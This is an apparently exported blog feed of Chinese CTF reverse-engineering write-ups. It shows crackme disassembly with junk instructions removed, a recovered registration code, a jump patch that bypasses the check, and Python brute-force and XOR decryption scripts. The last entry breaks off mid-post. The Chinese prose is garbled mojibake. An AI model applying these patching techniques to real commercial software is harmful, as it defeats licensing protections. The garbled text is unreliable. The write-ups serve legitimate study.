00403AC3    0000            ADD BYTE PTR DS:[EAX],AL
//èŠ±æŒ‡ä»¤  F8 73 01 74 NOPæ‰

00403AB7    90              NOP
00403AB8    90              NOP
00403AB9    90              NOP
00403ABA    90              NOP
00403ABB    8B5D D0         MOV EBX,DWORD PTR SS:[EBP-0x30]                            ; çœŸæ­£çš„æ³¨å†Œç å­˜æ”¾åœ°å€
00403ABE    8A03            MOV AL,BYTE PTR DS:[EBX]                                   ; å–çœŸæ­£çš„æ³¨å†Œç æŒ‰byte
//å»èŠ±æŒ‡ä»¤ä¹‹å

//æŸ¥çœ‹[EBX]å†…å®¹ï¼šï¼ˆæ­£ç¡®æ³¨å†Œç åœ¨è¿™é‡Œå‘€ï¼‰
0015CCC0  00000074 &apos;t&apos;
0015CCC4  00000066 &apos;f&apos;
0015CCC8  0000006F &apos;o&apos;
0015CCCC  00000073 &apos;s&apos;
0015CCD0  00000065 &apos;e&apos;
0015CCD4  00000064 &apos;d&apos;
0015CCD8  00000069 &apos;i&apos;
0015CCDC  00000077 &apos;w&apos;
0015CCE0  00000079 &apos;y&apos;
0015CCE4  00000062 &apos;b&apos;
0015CCE8  00000065 &apos;e&apos;
0015CCEC  00000064 &apos;d&apos;
0015CCF0  0000006F &apos;o&apos;
0015CCF4  00000063 &apos;c&apos;

00403AD3    8945 CC         MOV DWORD PTR SS:[EBP-0x34],EAX                            ; æ­£ç¡®æ³¨å†Œç åœ°å€å­˜å…¥å†…å­˜
00403AD6   /EB 01           JMP Xcrackme_.00403AD9
00403AD8   |0FEB01          POR MM0,QWORD PTR DS:[ECX]
00403ADB    BE E8000000     MOV ESI,0xE8
00403AE0    0083 042406C3   ADD BYTE PTR DS:[EBX+0xC3062404],AL
00403AE6    818B 45CCF873 0&gt;OR DWORD PTR DS:[EBX+0x73F8CC45],0xEB508501
00403AF0    01B1 FF75F8E8   ADD DWORD PTR DS:[ECX+0xE8F875FF],ESI
00403AF6    FD              STD
00403AF7    FC              CLD
00403AF8    FFFF            ???                                                        ; æœªçŸ¥å‘½ä»¤
//èŠ±æŒ‡ä»¤ EB 01 0F EB 01 BE E8 00 00 00 00 83 04 24 06 C3 81 ä»¥åŠ F8 73 01 85 NOPæ‰

00403AD3    8945 CC         MOV DWORD PTR SS:[EBP-0x34],EAX                            ; æ­£ç¡®æ³¨å†Œç åœ°å€å­˜å…¥å†…å­˜
00403AD6    90              NOP
00403AD7    90              NOP
00403AD8    90              NOP
00403AD9    90              NOP
00403ADA    90              NOP
00403ADB    90              NOP
00403ADC    90              NOP
00403ADD    90              NOP
00403ADE    90              NOP
00403ADF    90              NOP
00403AE0    90              NOP
00403AE1    90              NOP
00403AE2    90              NOP
00403AE3    90              NOP
00403AE4    90              NOP
00403AE5    90              NOP
00403AE6    90              NOP
00403AE7    8B45 CC         MOV EAX,DWORD PTR SS:[EBP-0x34]
00403AEA    90              NOP
00403AEB    90              NOP
00403AEC    90              NOP
00403AED    90              NOP
00403AEE    50              PUSH EAX
00403AEF    EB 01           JMP Xcrackme_.00403AF2
00403AF1    B1 FF           MOV CL,0xFF
00403AF3  ^ 75 F8           JNZ Xcrackme_.00403AED
00403AF5    E8 FDFCFFFF     CALL crackme_.004037F7
//å»èŠ±æŒ‡ä»¤ä¹‹å

00403AEF   /EB 01           JMP Xcrackme_.00403AF2
00403AF1   |B1 FF           MOV CL,0xFF
00403AF3  ^ 75 F8           JNZ Xcrackme_.00403AED
00403AF5    E8 FDFCFFFF     CALL crackme_.004037F7
00403AFA    83C4 08         ADD ESP,0x8
00403AFD    83F8 00         CMP EAX,0x0
//èŠ±æŒ‡ä»¤ EB 01 B1 NOPæ‰

00403AEF    90              NOP
00403AF0    90              NOP
00403AF1    90              NOP
00403AF2    FF75 F8         PUSH DWORD PTR SS:[EBP-0x8]
00403AF5    E8 FDFCFFFF     CALL crackme_.004037F7
00403AFA    83C4 08         ADD ESP,0x8
00403AFD    83F8 00         CMP EAX,0x0
//å»èŠ±æŒ‡ä»¤ä¹‹å

00403AF2    FF75 F8         PUSH DWORD PTR SS:[EBP-0x8]
00403AF5    E8 FDFCFFFF     CALL crackme_.004037F7                                     ; å…³é”®æ¯”è¾ƒ
00403AFA    83C4 08         ADD ESP,0x8
00403AFD    83F8 00         CMP EAX,0x0
//å¯ä»¥è·Ÿè¿› 4037F7

00403825    8B02            MOV EAX,DWORD PTR DS:[EDX]
00403827    3A01            CMP AL,BYTE PTR DS:[ECX]                                   ; æ ¸å¿ƒæ¯”è¾ƒï¼Œä¹Ÿå¯ä»¥æ¡ä»¶è®°å½•æ–­ç‚¹ä¸‹è¿™é‡Œï¼Œè®°å½•[ECX]ä¾¿æ˜¯æ¯ä¸€ä½æ­£ç¡®æ³¨å†Œç 
00403829    75 2B           JNZ Xcrackme_.00403856
//å¯¹æ¯”æ ¡éªŒæ³¨å†Œç ï¼Œæ¯æ¬¡åªæ¯”è¾ƒä¸€ä½ï¼ˆå¤±è´¥å°±ä¸å†æ ¡éªŒå‰©ä½™æ³¨å†Œç ï¼‰

//å¦‚æœå‰é¢è¢«èŠ±æŒ‡ä»¤å¹²æ‰°æ²¡æœ‰çœ‹åˆ°æ­£ç¡®æ³¨å†Œç ï¼Œé‚£ä¹ˆåœ¨æ­¤ä¸‹æ¡ä»¶è®°å½•æ–­ç‚¹ï¼Œä¹Ÿå¯ä»¥ä»è®°å½•ä¸­çœ‹åˆ°æ¯”è¾ƒå€¼
//Log data å–æœ«å°¾byteä½œä¸ºå­—ç¬¦ascii

åœ°å€       æ¶ˆæ¯
00403827   COND: 00150063 &apos;c&apos;
00403827   COND: 0015006F &apos;o&apos;
00403827   COND: 00150064 &apos;d&apos;
00403827   COND: 00150065 &apos;e&apos;
00403827   COND: 00150062 &apos;b&apos;
00403827   COND: 00150079 &apos;y&apos;
00403827   COND: 00150077 &apos;w&apos;
00403827   COND: 00150069 &apos;i&apos;
00403827   COND: 00150064 &apos;d&apos;
00403827   COND: 00150065 &apos;e&apos;
00403827   COND: 00150073 &apos;s&apos;
00403827   COND: 0015006F &apos;o&apos;
00403827   COND: 00150066 &apos;f&apos;
00403827   COND: 00150074 &apos;t&apos;

00403B2B    837D C8 00      CMP DWORD PTR SS:[EBP-0x38],0x0
00403B2F    0F84 0C000000   JE crackme_.00403B41                                       ; å…³é”®è·³è½¬
//æ­¤å¤„æ”¹ä¸ºJMPé‚£ä¹ˆä¹Ÿå°±çˆ†ç ´äº†

00403B35   /EB 01           JMP Xcrackme_.00403B38
00403B37   |B7 F9           MOV BH,0xF9
00403B39    72 01           JB Xcrackme_.00403B3C
00403B3B    86E9            XCHG CL,CH
00403B3D    0800            OR BYTE PTR DS:[EAX],AL
00403B3F    0000            ADD BYTE PTR DS:[EAX],AL
00403B41    58              POP EAX
//èŠ±æŒ‡ä»¤ EB 01 B7 F9 72 01 86 NOPæ‰

00403B35    90              NOP
00403B36    90              NOP
00403B37    90              NOP
00403B38    90              NOP
00403B39    90              NOP
00403B3A    90              NOP
00403B3B    90              NOP
00403B3C    E9 08000000     JMP crackme_.00403B49                                      ; è„±ç¦»æ³¨å†Œç éªŒè¯å¾ªç¯ä½“
00403B41    58              POP EAX
//å»èŠ±æŒ‡ä»¤ä¹‹å
</code></pre><p>ç»¼ä¸Šæ‰€è¿°ï¼š14ä½è¿æ¥ä¸€èµ·å°±æ˜¯æ³¨å†Œç ï¼Œå› æ­¤æ³¨å†Œç ä¸ºâ€codebywidesoftâ€ã€‚</p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>reverseä¹‹ç¬¬å…­æ›´</title>
    <url>/2017/01/24/reverse%E4%B9%8B%E7%AC%AC%E5%85%AD%E6%9B%B4/</url>
    <content><![CDATA[<p>æœ¬é¢˜åŒæ ·ä¹Ÿæ¶‰åŠåˆ°åè°ƒè¯•æŠ€æœ¯ï¼Œé¢˜ç›®æä¾›ä¸€ä¸ªexeå’Œä¸€ä¸ªdllï¼Œç”¨IDAåˆ†æç¨‹åºï¼š<br><a id="more"></a></p>
<p><img src="http://p1.bpimg.com/567571/70a93b006a742471.png" alt=""></p>
<p>loc_402000æ˜¯éªŒè¯flagæ˜¯å¦æ­£ç¡®çš„å‡½æ•°ï¼Œç‚¹å¼€ä¸€çœ‹ã€‚ã€‚ã€‚ä¸€è„¸æ‡µé€¼</p>
<p><img src="http://p1.bqimg.com/567571/b0ab23cb23308271.png" alt=""></p>
<p>åº”è¯¥æ˜¯SMCï¼Œæ‰€è°“SMCå°±æ˜¯ç›¸å½“äºæŠŠæŸäº›é‡è¦å‡½æ•°åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­è¿›è¡ŒåŠ å¯†ï¼Œè¿™äº›å‡½æ•°åœ¨ç¨‹åºæ‰§è¡Œçš„æ—¶å€™ä¼šåŠ¨æ€è§£å¯†ã€‚ç„¶è€ŒODä¸­ä¼šå‡ºç°åè°ƒè¯•ã€‚</p>
<p>æ¥ä¸‹æ¥è¿è¡Œç¨‹åºï¼Œç„¶åå°†ä¹‹debugger attachåˆ°IDAä¸Šï¼ŒåŠ å¯†æ•°æ®æ®µå°±è§£å¯†äº†ï¼Œä¸è¿‡å¯èƒ½æ˜¯æˆ‘çš„IDAçš„é—®é¢˜ï¼Œè¿™ä¸ªè¿‡ç¨‹ååˆ†æ¼«é•¿ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<p>åŠ è½½å®Œæˆä¹‹å</p>
<p><img src="http://p1.bpimg.com/567571/e2027be2a13e885b.png" alt=""></p>
<p>åœ¨loc_402000ä½ç½®åˆ›å»ºä¸€ä¸‹å‡½æ•°ï¼ŒF5åç¼–è¯‘ã€‚å‘ç°è¿™ä¸ªå‡½æ•°é¦–å…ˆä¸ºå¾—åˆ°re1DLL.dllçš„Trolololololololæ•°ç»„ï¼Œç„¶åä¸æ–­å°†ç”¨æˆ·è¾“å…¥ä¸Trolololololololæ•°ç»„ä¸­çš„æŸäº›å…ƒç´ è¿›è¡Œæ¯”è¾ƒï¼Œå‰é¢ä¸€äº›æ¯”è¾ƒæŒ‡ä»¤ç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œå¾—åˆ°äº†flagçš„å‰åŠéƒ¨åˆ†ISCC{N3v3r_7r4apped_6y_4nt!_XXXXX}<br>æœ€åçš„XXXXXæ˜¯é€šè¿‡re1DLL.dllçš„Derpaherpå‡½æ•°è¿›è¡Œsetçš„</p>
<p> <img src="http://i1.piimg.com/567571/c77f2dcf766c9a0c.png" alt=""></p>
<p>Derpaherpæ˜¯æœ‰ä¸‰ä¸ªå‚æ•°çš„ï¼Œè¿™é‡Œåªæœ‰ä¸€ä¸ªæ˜¯IDA F5çš„é”…ï¼Œè°ƒåˆ°æ±‡ç¼–ä»ç„¶å¯ä»¥çœ‹åˆ°è°ƒç”¨Derpaherpä¹‹å‰pushäº†ä¸‰ä¸ªå‚æ•°ï¼Œæœ€åä¼šæœ‰ä¸€ä¸ªstrcmpï¼Œv13å’Œunk_405048æ¯”è¾ƒï¼Œæˆ‘æŠŠunk_405048å¯¼å‡ºæ¥å‘ç°å…¶ä¸ºad42f6697b035b7580e4fef93be20b4dï¼Œæ˜¯Md5ï¼Œæ‹–å…¥cmd5.comè·‘äº†ä¸€ä¸‹ï¼Œè·‘å‡ºæ¥æ˜¯debugã€‚ç”±æ­¤ä¹Ÿå¯ä»¥æ–­å®šDerpaherpå†…éƒ¨å…¶å®æ˜¯å®ç°äº†Md5è®¡ç®—ï¼Œæ‰€ä»¥æœ€åçš„flagä¸ºISCC{N3v3r_7r4apped_6y_4nt!_debug}</p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>reverseä¹‹ç¬¬åæ›´</title>
    <url>/2017/02/05/reverse%E4%B9%8B%E7%AC%AC%E5%8D%81%E6%9B%B4/</url>
    <content><![CDATA[<p>ä¸€é“æ¯”è¾ƒå¤æ‚çš„ç®—æ³•Crackï¼Œä¸»è¦è€ƒæŸ¥CRCæ ¡éªŒç®—æ³•ï¼ŒAESåŠ å¯†ï¼Œä»¥åŠbase64åŠ å¯†ç®—æ³•ã€‚<br><a id="more"></a><br>ç¨‹åºè¿è¡Œä¹‹åå‘ç°æç¤ºå†…å®¹æ˜¯Try anginï¼ä½†æ˜¯æœç´¢å­—ç¬¦ä¸²å¹¶æ²¡æœ‰ï¼Œä½†æ˜¯çœ‹åˆ°ä¸€ä¸ªå¾ˆåƒbase64çš„å­—ç¬¦ä¸²ï¼Œè¿‡å»å‘ç°å„ç§ç®—æ³•ä»¥åŠè°ƒç”¨ï¼Œåœ¨å‡½æ•°å¼€å¤´ä¸‹æ–­ï¼Œæœç„¶åŠ å¯†ç®—æ³•éƒ½åœ¨è¿™ä¸ªåœ°æ–¹ã€‚</p>
<p>åœ¨IDAä¸­åˆ†æè¯¥å‡½æ•°</p>
<pre><code>char __thiscall sub_401880(int this)
{
  int v1; // ebx@1
  char v2; // al@1
  char v3; // dh@1
  char v4; // ch@1
  char v5; // ah@1
  char v6; // dl@1
  char v7; // cl@1
  unsigned int v8; // esi@7
  unsigned int v9; // eax@7
  char *v10; // ecx@7
  char result; // al@8
  unsigned int v12; // esi@10
  wchar_t *v13; // edi@11
  unsigned int v14; // ecx@13
  unsigned int v15; // kr18_4@13
  unsigned int v16; // kr1C_4@14
  CHAR *v17; // ecx@18
  char v18; // [sp+4h] [bp-1F8h]@1
  char v19; // [sp+5h] [bp-1F7h]@1
  char v20; // [sp+6h] [bp-1F6h]@1
  char v21; // [sp+7h] [bp-1F5h]@1
  char v22; // [sp+8h] [bp-1F4h]@1
  char v23; // [sp+9h] [bp-1F3h]@1
  char v24; // [sp+Ah] [bp-1F2h]@1
  char v25; // [sp+Bh] [bp-1F1h]@1
  char v26[200]; // [sp+Ch] [bp-1F0h]@13
  char v27[132]; // [sp+D4h] [bp-128h]@10
  __int128 v28; // [sp+158h] [bp-A4h]@13
  __int128 v29; // [sp+168h] [bp-94h]@13
  __int64 v30; // [sp+178h] [bp-84h]@13
  int v31; // [sp+180h] [bp-7Ch]@13
  char v32; // [sp+184h] [bp-78h]@13
  char Dst; // [sp+185h] [bp-77h]@13
  CHAR v34; // [sp+1BCh] [bp-40h]@7
  int v35; // [sp+1D0h] [bp-2Ch]@10
  int v36; // [sp+1D4h] [bp-28h]@10
  int v37; // [sp+1D8h] [bp-24h]@10
  int v38; // [sp+1DCh] [bp-20h]@10
  CHAR v39[4]; // [sp+1E0h] [bp-1Ch]@1
  int v40; // [sp+1E4h] [bp-18h]@1
  __int16 v41; // [sp+1E8h] [bp-14h]@1
  CHAR MultiByteStr[4]; // [sp+1ECh] [bp-10h]@1
  int v43; // [sp+1F0h] [bp-Ch]@1
  int v44; // [sp+1F4h] [bp-8h]@1

  v1 = this;
  *(_DWORD *)v39 = 0x20756F59;
  v40 = &apos;!niW&apos;;
  v41 = &apos;\0&apos;;
  *(_DWORD *)MultiByteStr = &apos; yrT&apos;;
  v2 = *(_BYTE *)this;
  v3 = *(_BYTE *)(this + 1);
  v4 = *(_BYTE *)(this + 2);
  v5 = *(_BYTE *)(v1 + 3);
  v6 = *(_BYTE *)(v1 + 4);
  v7 = *(_BYTE *)(v1 + 5);
  v18 = v2;
  v43 = &apos;iaga&apos;;
  v44 = &apos;!n&apos;;
  v19 = v3;
  v20 = v4;
  v21 = 0;
  v22 = v5;
  v23 = v6;
  v24 = v7;
  v25 = 0;
  if ( (unsigned __int8)(v2 - 65) &gt; 0x19u
    || (unsigned __int8)(v3 - 65) &gt; 0x19u
    || (unsigned __int8)(v4 - 65) &gt; 0x19u
    || (unsigned __int8)(v5 - 65) &gt; 0x19u
    || (unsigned __int8)(v6 - 65) &gt; 0x19u
    || (unsigned __int8)(v7 - 65) &gt; 0x19u )
  {
    result = sub_4016D0(MultiByteStr);
  }
  else
  {
    v8 = CRC((int)&amp;v18, strlen(&amp;v18));
    v9 = CRC((int)&amp;v22, strlen(&amp;v22));
    sub_401490(&amp;WideCharStr, 30, L&quot;%08x%08x&quot;, v8, v9);
    sub_401840(&amp;WideCharStr, &amp;v34);
    sub_4016D0(MultiByteStr);
    v10 = (char *)v1;
    do
      result = *v10++;
    while ( result );
    if ( !(((_BYTE)v10 - ((_BYTE)v1 + 1)) &amp; 0xF) )
    {
      v35 = 0x1020304;
      v36 = 0x7080900;
      v37 = 0xE0F0506;
      v38 = 0xA0B0C0D;
      sub_401380((_BYTE *)v1, (int)v27, strlen((const char *)v1), (int)&amp;v34, (int)&amp;v35);
      v12 = 0;
      if ( strlen((const char *)v1) )
      {
        v13 = &amp;WideCharStr;
        do
        {
          sub_401490(v13, 3, L&quot;%02x&quot;, (unsigned __int8)v27[v12++]);
          v13 += 2;
        }
        while ( v12 &lt; strlen((const char *)v1) );
      }
      sub_401840(&amp;WideCharStr, v27);
      sub_401570(strlen(v27), (int)v27, v26);
      v31 = &apos;=X7V&apos;;
      _mm_storeu_si128((__m128i *)&amp;v28, _mm_loadu_si128((const __m128i *)&amp;xmmword_4034F4));
      v32 = 0;
      _mm_storeu_si128((__m128i *)&amp;v29, _mm_loadu_si128((const __m128i *)&amp;xmmword_403504));
      _mm_storel_epi64((__m128i *)&amp;v30, _mm_loadl_epi64((const __m128i *)&amp;qword_403514));
      memset(&amp;Dst, 0, 0x37u);
      v14 = 0;
      v15 = strlen((const char *)&amp;v28);
      if ( v15 )
      {
        v16 = strlen(v26);
        while ( v14 &lt; v16 )
        {
          if ( *((_BYTE *)&amp;v28 + v14) != v26[v14] )
          {
            v17 = MultiByteStr;
            goto LABEL_19;
          }
          if ( ++v14 &gt;= v15 )
            break;
        }
      }
      v17 = v39;
LABEL_19:
      result = sub_4016D0(v17);
    }
  }
  return result;
}
</code></pre><p>é¦–å…ˆå‘ç°ï¼ŒæˆåŠŸå’Œå¤±è´¥çš„æç¤ºè¢«å®šä¹‰ä¸ºå­—ç¬¦ä¸²ä¿å­˜åœ¨å‡½æ•°ä¸­ï¼Œç¨‹åºè¿è¡Œä¹‹åæ‰ä¼šå‡ºç°ã€‚ç¨‹åºçš„å¤§è‡´æµç¨‹æ˜¯å…ˆå°†è¾“å…¥çš„å‰å…­ä½å–å‡ºï¼Œåˆ¤æ–­æ˜¯ä¸æ˜¯å¤§å†™å­—æ¯ï¼Œå¦‚æœä¸æ˜¯å°±å¤±è´¥ã€‚</p>
<p>ä¹‹åå°†å‰å…­ä½åˆ†æˆä¸¤ç»„ï¼Œæ±‚å…¶CRC32çš„æ ¡éªŒç ï¼ŒCRCçš„ç®—æ³•å¦‚ä¸‹ï¼š</p>
<pre><code>uint crc32( uchar *buf, int len)
{
    uint ret = 0xFFFFFFFF;
    int   i;
    if( !init )
    {
         init_table();
         init = 1;
    }
    for(i = 0; i &lt; len;i++)
    {
         ret = CRC32[((ret &amp; 0xFF) ^ buf[i])] ^ (ret &gt;&gt; 8);
    }
     ret = ~ret;
    return ret;
}
</code></pre><p>CRCç®—æ³•æ±‚è§£å…³é”®åœ¨äºCRCè¡¨çš„ç”Ÿæˆï¼Œä¸€èˆ¬éƒ½æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œä¹Ÿå¯ä»¥é™æ€å®šä¹‰ï¼Œä¸è¿‡å¾ˆéº»çƒ¦ã€‚ç¬¬ä¸€æ¬¡æ±‚CRCåˆå§‹çš„retæ˜¯-1ï¼Œä¹‹åçš„retå°±æ˜¯ä¸Šä¸€æ¬¡æ‰€æ±‚çš„CRCï¼Œä»¥æ­¤åŸç†å°†ä¸¤éƒ¨åˆ†çš„CRCè½¬æ¢ä¸º8ä½çš„16è¿›åˆ¶è¿æ¥èµ·æ¥ä½œä¸ºä¸‹é¢AESåŠ å¯†çš„å¯†é’¥ã€‚</p>
<p>åŠ å¯†ä¹‹åçš„ç»“æœè½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè¿›è¡Œbase64ç¼–ç ï¼Œä¸ç¨‹åºç»™å‡ºçš„XQXgWk5yLADiXx6hVQCAKxTjVQXiWxPhXASCKALhV7X=æ¯”è¾ƒï¼Œbase64è½¬æ¢è¿‡ç¨‹ä¸­çš„ç½®æ¢è¡¨ä¸å¹³å¸¸çš„æœ‰äº›åŒºåˆ«</p>
<pre><code>0987654321ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba+/
</code></pre><p>æœ€ç»ˆæ±‚æ­£ç¡®çš„æ³¨å†Œç å¿…é¡»è¦æšä¸¾å¯†é’¥ï¼Œåè§£AESç„¶åæ¯”è¾ƒè§£å¯†ç»“æœçš„å‰å…­ä½ä¸å¯†é’¥æ˜¯å¦ä¸€è‡´ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code># _*_ coding:utf-8 _*_

from Crypto.Cipher import AES
import string
from zlib import crc32

def crack():
    atable=&apos;0987654321ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba+/&apos;
    btable=&apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&apos;
    base=&apos;XQXgWk5yLADiXx6hVQCAKxTjVQXiWxPhXASCKALhV7X=&apos;
    transtab=string.maketrans(atable,btable)
    iv=&apos;\x04\x03\x02\x01\x00\x09\x08\x07\x06\x05\x0f\x0e\x0d\x0c\x0b\x0a&apos;
    table=list(string.uppercase)
    c=base.translate(transtab).decode(&apos;base64&apos;).decode(&apos;hex&apos;)
    count=0
    for i1 in table:
        for i2 in table:
            for i3 in table:
                for i4 in table:
                    for i5 in table:
                        for i6 in table:
                            key=&apos;%08x&apos;%(crc32(i1+i2+i3)&amp;0xffffffff)+&apos;%08x&apos;%(crc32(i4+i5+i6)&amp;0xffffffff)
                            crypto=AES.new(key,AES.MODE_CBC,iv)
                            m=crypto.decrypt(c)
                            count+=1
                            if count%5000000==0:
                                print count
                            if m[:6]==i1+i2+i3+i4+i5+i6:
                                print &apos;flag:&apos;+m
                                return
if __name__==&apos;__main__&apos;:
    crack()
</code></pre>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>reverseä¹‹ç¬¬å››æ›´</title>
    <url>/2017/01/20/reverse%E4%B9%8B%E7%AC%AC%E5%9B%9B%E6%9B%B4/</url>
    <content><![CDATA[<p>é¦–å…ˆè¯»å–æ–‡ä»¶çš„å¤´å››ä¸ªå­—èŠ‚åˆ¤æ–­æ˜¯å¦æ˜¯0x33465443ï¼Œä¸æ˜¯æç¤ºâ€œä½ æ‰“å¼€çš„ä¸æ˜¯.ctfåŠ å¯†æ–‡ä»¶â€ã€‚<br><a id="more"></a></p>
<p><img src="http://p1.bqimg.com/567571/a39714c92cd59c03.png" alt=""></p>
<p>å†æ¥ç€è¯»å–äº†0x10ä¸ªå­—èŠ‚ã€‚å®ƒç”¨æ¥éªŒè¯è¾“å…¥çš„å¯†ç æ˜¯å¦æ­£ç¡®ã€‚ç„¶åè¯»å–äº†4ä¸ªå­—èŠ‚ï¼Œå®ƒå†³å®šäº†è§£å¯†æ•°æ®éƒ¨åˆ†çš„é•¿åº¦ã€‚æœ€åå°±æ˜¯æ ¹æ®è¿™ä¸ªæ•°æ®é•¿åº¦è¯»å–æŒ‡å®šçš„å­—èŠ‚æ•°ã€‚</p>
<p><img src="http://p1.bpimg.com/567571/fbd00866b10d1c81.png" alt=""></p>
<p>æ•´ä¸ªåŠ å¯†æ–‡ä»¶æœ‰0x61C9ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥çœŸæ­£çš„æ•°æ®éƒ¨åˆ†é•¿åº¦ä¸ä¼šè¶…è¿‡è¿™ä¸ªå¤§å°ã€‚è§‚å¯ŸåŠ å¯†æ–‡ä»¶å¤´éƒ¨ï¼Œå¾ˆå®¹æ˜“æ‰¾åˆ°æ•°æ®éƒ¨åˆ†çš„é•¿åº¦ã€‚</p>
<p><img src="http://p1.bqimg.com/567571/d161617008852e03.png" alt=""></p>
<p>æ•´ä¸ªæ–‡ä»¶0x619Cä¸ªå­—èŠ‚éƒ½æ˜¯åŠ å¯†æ•°æ®ï¼Œå‰é¢çš„æ˜¯å¤´éƒ¨ã€‚</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯è§£å¯†ï¼Œè¾“å…¥çš„å¯†é’¥ç»è¿‡md5åŠ å¯†å¾—åˆ°çš„16å­—èŠ‚ä½œä¸ºå¯†é’¥å¯¹æ•°æ®è¿›è¡Œå¼‚æˆ–ï¼Œæ¯å¼‚æˆ–16å­—èŠ‚ï¼Œå¯†é’¥å°±è‡ªå¢1ï¼Œæ•°æ®æ®µé‡Œæœ‰éƒ¨åˆ†æ•°æ®æ˜¯å¦‚ä¸‹ï¼š</p>
<p><img src="http://i1.piimg.com/567571/9eba76040404226a.png" alt=""><br>è§„å¾‹å¾ˆæ˜æ˜¾ï¼Œç”±æ­¤å¯ä»¥æ¨æ–­è¿™ä¸€éƒ¨åˆ†å¯¹åº”çš„æ˜æ–‡æ˜¯0x00,æ•°æ®æ˜¯ä»43 C9 FDå¼€å§‹åŠ å¯†ï¼Œå¾ˆå®¹æ˜“æ¨å‡ºåŠ å¯†çš„å¯†é’¥æ˜¯0x13,0x82,0xFE,0x47,0xe4,0xb9,0x8e,0xd8,0x68,0xfc,0xa1,0xd5,0x4a,0x4f,0x36,0x2</p>
<p>è§£å¯†è„šæœ¬å¦‚ä¸‹:</p>
<pre><code>a=&apos;17 86 02 4B E8 BD 92 DC 6C 00 A5 D9 4E 53 3A 06&apos;
aList=a.split(&apos; &apos;)
oriList=[]
for i in aList:
    oriList.append((int(i,16)-4)&amp;0xff)
print(oriList)
f=open(&apos;1.ctf&apos;,&apos;rb&apos;)
ctfdata=f.read()
f.close()

f=open(&apos;encrypt.ctf&apos;,&apos;wb&apos;)
validData=ctfdata[0x2d:]
for i in range(0,len(validData)):
    data=int(validData[i].encode(&apos;hex&apos;),16)
    tmp=data^oriList[i%16]
    f.write(chr(tmp))
    oriList[i%16]+=1
    oriList[i%16]=oriList[i%16]&amp;0xff
f.close()
</code></pre>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>reverseç¬¬äºŒæ›´ä¹‹é—®é¼æ¯2106-6-2</title>
    <url>/2016/12/05/reverse%E7%AC%AC%E4%BA%8C%E6%9B%B4%E4%B9%8B%E9%97%AE%E9%BC%8E%E6%9D%AF2106-6-2/</url>
    <content><![CDATA[<p>é¢˜ç›®æä¾›äº†ä¸€ä¸ªexeç¨‹åºå’Œä¸€ä¸ªæ–‡æœ¬readme.txtï¼Œtxtå†…å®¹å¦‚ä¸‹ï¼š<br><a id="more"></a></p>
<pre><code>é—®é¢˜æè¿°ï¼š
name:
serial:78767-77666-76786-87788-77778-66867-66777-86767-66877-77778-88887

æ ¹æ®åºåˆ—å·æ±‚nameã€‚nameå°±æ˜¯æ­£ç¡®çš„flag

Hint:
nameä¸€å…±12ä½ï¼Œ
name[0]=&apos;{&apos;,name[1]=&apos;h&apos;,name[2]=&apos;d&apos;,name[3]=&apos;u&apos;
name[5]=&apos;b&apos;,name[9]=&apos;0&apos;,name[10]=&apos;_&apos;,name[11]=&apos;}&apos;
å…¶ä»–ä½çš„èŒƒå›´ä¸º26ä¸ªå°å†™å­—æ¯å’Œä¸‹åˆ’çº¿
æš´åŠ›å¾ªç¯6minå¤šç‚¹ï¼ˆ64ä½i5å…­ä»£cpuï¼Œpythonï¼‰
</code></pre><p>å¾ˆæ˜æ˜¾å°±æ˜¯ä¸ªé€šè¿‡nameè®¡ç®—serialçš„ç®—æ³•ï¼Œnameåº”è¯¥æ˜¯{hdu?b???0_}ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å·²çŸ¥çš„serialé€†æ¨nameã€‚ç”¨ODè°ƒè¯•ç¨‹åºï¼š</p>
<p><img src="http://p1.bpimg.com/567571/5063259205174ddf.png" alt=""></p>
<p>æˆ‘ä»¬è¾“å…¥name=â€™{hdu4b3210_}â€™hå’Œå·²çŸ¥çš„serialï¼Œnameä¿å­˜åˆ°äº†[local16],serialä¿å­˜åˆ°[local10]ã€‚</p>
<p><img src="http://p1.bpimg.com/567571/dd58b26005ea8906.png" alt=""></p>
<p>IDAå’ŒODç»“åˆåˆ†ææ‰¾åˆ°å…³é”®çš„å‡½æ•°åº”è¯¥æ˜¯002D2080</p>
<p><img src="http://p1.bpimg.com/567571/9bf1aace82d28c45.png" alt=""><br>åœ¨002D2080å‡½æ•°é‡Œæ‰¾åˆ°ä¸Šè¿°è¯­å¥ï¼Œä¸ºå‡½æ•°002D1F30ä¼ é€’å‚æ•°ï¼Œå†æ¬¡è·Ÿè¿›002D1F30</p>
<p><img src="http://i1.piimg.com/567571/6c1f52b94c8d4f9e.png" alt=""><br>å°†å‰ä¸¤ä½è¿›è¡Œè¿ç®—ç„¶ååŠ èµ·æ¥çš„å€¼7å­˜å…¥[local3],ä¹‹åçš„æ¯ä¸€ä½éƒ½æ˜¯ä¸€æ ·çš„é“ç†,æœ€åæŠŠäº”ä½serialç èµ‹å€¼åˆ°eax+0x4</p>
<p><img src="http://p1.bpimg.com/567571/b263abf1ac2a8d48.png" alt=""></p>
<p><img src="http://p1.bqimg.com/567571/b3024a62d0d9470d.png" alt=""></p>
<p>nameä¸€å…±12ä½ï¼Œserialä¸€å…±11ä¸ªéƒ¨åˆ†ï¼Œæ¯ä¸¤ä½æ±‚å‡ºä¸€éƒ¨åˆ†ï¼Œè¿‡ç¨‹å¦‚ä¸‹:</p>
